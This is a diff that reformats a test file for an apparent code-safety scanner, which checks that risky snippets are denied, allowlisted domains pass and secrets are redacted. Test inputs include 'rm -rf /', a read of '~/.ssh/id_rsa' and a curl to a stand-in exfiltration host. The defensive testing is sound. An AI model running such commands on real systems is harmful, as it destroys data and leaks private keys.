@@ -26,8 +26,11 @@ def test_samples_match_expected_decisions():
     samples = _samples()
 
     for sample in samples:
-        report = scanner.scan(content=sample["content"], language=sample["language"], tool_name=sample["name"])
-        assert report.decision == SafetyDecision(sample["expected_decision"]), sample["name"]
+        report = scanner.scan(content=sample["content"],
+                              language=sample["language"],
+                              tool_name=sample["name"])
+        assert report.decision == SafetyDecision(
+            sample["expected_decision"]), sample["name"]
         for rule_id in sample["expected_rule_ids"]:
             assert rule_id in report.rule_ids, sample["name"]
         assert report.elapsed_ms >= 0
@@ -38,8 +41,10 @@ def test_secret_delete_and_network_are_denied():
     scanner = SafetyScanner(SafetyPolicy(allowed_domains=["api.example.com"]))
 
     delete_report = scanner.scan(content="rm -rf /", language="bash")
-    secret_report = scanner.scan(content='open("~/.ssh/id_rsa").read()', language="python")
-    network_report = scanner.scan(content='curl https://exfil.example/path', language="bash")
+    secret_report = scanner.scan(content='open("~/.ssh/id_rsa").read()',
+                                 language="python")
+    network_report = scanner.scan(content='curl https://exfil.example/path',
+                                  language="bash")
 
     assert delete_report.decision == SafetyDecision.DENY
     assert secret_report.decision == SafetyDecision.DENY
@@ -49,22 +54,24 @@ def test_secret_delete_and_network_are_denied():
 def test_policy_changes_allowlist_without_code_changes():
     scanner = SafetyScanner(SafetyPolicy(allowed_domains=["allowed.example"]))
 
-    allowed = scanner.scan(content="curl https://allowed.example/status", language="bash")
-    denied = scanner.scan(content="curl https://blocked.example/status", language="bash")
+    allowed = scanner.scan(content="curl https://allowed.example/status",
+                           language="bash")
+    denied = scanner.scan(content="curl https://blocked.example/status",
+                          language="bash")
 
     assert allowed.decision == SafetyDecision.ALLOW
     assert denied.decision == SafetyDecision.DENY
 
 
 def test_policy_can_disable_a_rule():
-    policy = SafetyPolicy.model_validate({
-        "rules": {
+    policy = SafetyPolicy.model_validate(
+        {"rules": {
             "DEPENDENCY_INSTALL": {
                 "enabled": False
             }
-        }
-    })
-    report = SafetyScanner(policy).scan(content="pip install demo", language="bash")
+        }})
+    report = SafetyScanner(policy).scan(content="pip install demo",
+                                        language="bash")
 
     assert "DEPENDENCY_INSTALL" in report.rule_ids
     assert report.decision == SafetyDecision.ALLOW
@@ -72,17 +79,22 @@ def test_policy_can_disable_a_rule():
 
 def test_policy_limits_timeout_from_metadata():
     policy = SafetyPolicy(max_timeout_seconds=30)
-    report = SafetyScanner(policy).scan(content="echo hello", language="bash", metadata={"timeout": 120})
+    report = SafetyScanner(policy).scan(content="echo hello",
+                                        language="bash",
+                                        metadata={"timeout": 120})
 
     assert report.decision == SafetyDecision.NEEDS_HUMAN_REVIEW
     assert "RESOURCE_LONG_SLEEP" in report.rule_ids
 
 
 def test_sensitive_evidence_is_redacted():
-    report = SafetyScanner().scan(content='password = "super-secret-value"\nprint(password)', language="python")
+    report = SafetyScanner().scan(
+        content='password = "super-secret-value"\nprint(password)',
+        language="python")
 
     assert report.redacted is True
-    assert any("<redacted:secret>" in finding.evidence for finding in report.findings)
+    assert any("<redacted:secret>" in finding.evidence
+               for finding in report.findings)
 
 
 def test_500_line_script_scans_under_one_second():
